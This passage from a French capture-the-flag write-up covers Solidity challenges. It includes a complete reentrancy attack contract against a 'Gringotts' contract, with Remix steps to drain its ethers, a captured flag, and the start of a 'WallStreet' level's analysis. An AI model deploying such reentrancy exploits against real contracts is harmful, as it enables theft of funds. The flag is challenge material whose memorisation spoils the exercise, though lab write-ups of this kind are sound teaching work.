  &lt;p&gt;Il faut penser à recréer une nouvelle instance du challenge, car la précédente est bloquée, &lt;code class=&quot;highlighter-rouge&quot;&gt;alreadyWithdrawn&lt;/code&gt; étant à &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;pragma&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;solidity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Gringotts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// tous le code du contrat&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Attack&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    
  	&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb5718566197aB563FF468e03D6B9eb6F76627cF0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse de la nouvelle instance du smart contract&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;Gringotts&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Gringotts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;donateToSorcery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withdrawAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;selfdestruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withdrawAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;le constructeur va initialiser notre smart contrat déjà existant qui se trouve à l’adresse &lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;collect()&lt;/code&gt; va mettre en place l’attaque Re-Entrancy.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;la fallback function sera exécutée tant qu’il y a encore des ethers a dérober.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;kill()&lt;/code&gt;va detruire le smart contract &lt;code class=&quot;highlighter-rouge&quot;&gt;Attack&lt;/code&gt;et envoyer les ethers au créateur de la transaction.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://solidity.readthedocs.io/en/v0.4.21/introduction-to-smart-contracts.html&quot;&gt;Introduction to Smart Contracts&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;The only possibility that code is removed from the blockchain is when a contract at that address performs the &lt;code class=&quot;highlighter-rouge&quot;&gt;selfdestruct&lt;/code&gt; operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Pour mettre en place l’attaque, nous allons utiliser &lt;a href=&quot;https://remix.ethereum.org&quot;&gt;Remix&lt;/a&gt;, créer par exemple le fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;Attack.sol&lt;/code&gt;, y mettre tout le code précédent, le compiler. Déployer ensuite une instance de &lt;code class=&quot;highlighter-rouge&quot;&gt;Attack.sol&lt;/code&gt; dans l’environnement &lt;code class=&quot;highlighter-rouge&quot;&gt;Injected Web3&lt;/code&gt;. Patienter, et lancer la méthode &lt;code class=&quot;highlighter-rouge&quot;&gt;collect()&lt;/code&gt; afin que notre instance de &lt;code class=&quot;highlighter-rouge&quot;&gt;Attack.sol&lt;/code&gt;dérobe tout les ethers, attendre la fin de la transaction. Puis &lt;code class=&quot;highlighter-rouge&quot;&gt;kill()&lt;/code&gt; pour récupérer ce que l’on vient de dérober dans notre wallet.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;availableAllowance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Après l’attaque, tous les ethers sont récupérés depuis le smart contract. On demande alors le flag.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SANTA{R3eN7r4ncY_f0r_Th3_WiN}&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;level-4---wallstreet&quot;&gt;Level 4 - WallStreet&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;: 400&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;WallStreet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stockExchangeAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectFundsDate&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14600&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;days&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostMoneyAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;stockExchangeAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;receiveMoneyAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stockExchangeAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawMoney&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectFundsDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostClientMoney&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;lostMoneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostMoneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostClientMoney&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostClientMoney&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ether&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getStockExchangeAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stockExchangeAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
    &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;dateOfCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectFundsDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;analyse-3&quot;&gt;Analyse&lt;/h2&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawMoney&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectFundsDate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostClientMoney&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;lostMoneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostMoneyAmount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostClientMoney&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;lostClientMoney&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;balance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ether&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pas besoin de comprendre ce que fait exactement cette fonction. On sait juste qu’elle envoi des ethers,   mais seulement au propriétaire (&lt;code class=&quot;highlighter-rouge&quot;&gt;contractOwner&lt;/code&gt;) du smart contract.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getStockExchangeAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;returns&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;stockExchangeAmount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
